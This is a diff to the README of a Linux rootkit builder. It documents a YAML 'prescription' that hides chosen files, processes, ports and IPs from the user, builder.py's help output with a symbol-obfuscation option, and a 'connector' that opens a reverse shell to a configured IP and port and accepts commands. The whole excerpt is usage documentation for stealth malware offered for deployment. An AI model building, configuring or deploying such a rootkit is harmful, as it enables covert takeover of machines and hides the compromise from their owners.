@@ -30,7 +30,7 @@ Example of full prescription (every option can be omitted):
 
 ```yaml
 hideme: true
-connector: 
+connector:
     ip: "127.0.0.1"
     port: "8080"
 hide_dent: # Here you can put all your files, directories and process id you want to hide from user
@@ -41,7 +41,7 @@ hide_port:
     - "1337"
 hide_ip:
     - "127.0.0.1"
-    - "8.8.8.8"    
+    - "8.8.8.8"
 shells:
     - "sleep 1000"
 ```
@@ -49,9 +49,23 @@ shells:
 After you create your yaml just run the builder.py
 
 ```sh
-$ python3 builder.py --config testfiles/config.yml
+$ python3 builder.py --help
+usage: builder.py [-h] [-c CONFIG] [-o [OBFUSCATE]]
+
+Generate rootkit from yaml prescription
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c CONFIG, --config CONFIG
+                        Yaml prescription file
+  -o [OBFUSCATE], --obfuscate [OBFUSCATE]
+                        Enable rootkit symbols obfuscation
+
 ```
-And rootkit.ko will be created.
+
+![builder](images/builder.png)
+
+And rootkit will be created.
 
 another way to execute your hiding or shell script is connector, if you enable your connector, rev-sell connection is created to your defined IP and Port, after this it will try open connection every x second. After connection is opened multiple commands can be send:
 
